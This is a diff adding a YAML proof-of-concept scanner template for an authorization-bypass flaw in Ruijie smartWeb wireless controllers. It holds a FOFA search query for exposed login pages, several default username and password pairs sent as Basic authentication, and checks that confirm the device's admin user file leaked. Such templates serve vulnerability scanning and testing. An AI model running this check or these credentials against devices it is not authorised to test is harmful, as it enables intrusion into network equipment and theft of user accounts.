@@ -1,0 +1,34 @@
+id: poc-yaml-ruijie-smartweb-webuser-auth-xml-ultra-vires
+info:
+  name: 锐捷 smartWeb webuser-auth.xml 越权漏洞
+  severity: high
+  tags:
+  - 权限绕过
+  finger: ruijie_smartweb
+  fofa: title="无线smartWeb--登录页面"
+variables:
+  payload: 'base64("guest:guest")
+
+    base64("manager:manager")
+
+    base64("ruijie:ruijie")
+
+    '
+  random: base64("root:"+random_str(8))
+firstRequest:
+  method: GET
+  path: /web/xml/webuser-auth.xml
+  headers:
+    Authorization: Basic {{.random}}
+  expression: 'contains(title,"Authorization Required")
+
+    '
+requests:
+- method: GET
+  path: /web/xml/webuser-auth.xml
+  headers:
+    Authorization: Basic {{.payload}}
+  expression: "status_code == 200 && \ncontains(body,\"<userauth>\") && \ncontains(body,\"\
+    admin\") &&\ncontains(body,\"<level>0</level>\") &&\ncontains(content_type,\"\
+    */*\")\n"
+transport: http
